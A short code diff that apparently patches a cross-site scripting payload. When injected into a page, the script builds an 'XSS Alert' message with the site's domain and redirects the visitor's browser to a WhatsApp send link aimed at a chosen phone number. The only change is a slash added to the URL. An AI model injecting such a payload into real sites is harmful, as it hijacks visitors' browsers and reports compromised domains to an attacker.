@@ -5,7 +5,7 @@ var messageContent = 'XSS Alert in ' + document.domain +
 
 function whatsappSend(phoneNumber, messageContent) {
     // Replace the following line with the appropriate WhatsApp API endpoint and authentication
-    var apiUrl = 'https://api.whatsapp.com/send?phone=' + phoneNumber + '&text=' + encodeURIComponent(messageContent);
+    var apiUrl = 'https://api.whatsapp.com/send/?phone=' + phoneNumber + '&text=' + encodeURIComponent(messageContent);
     window.location.href = apiUrl;
 }
 
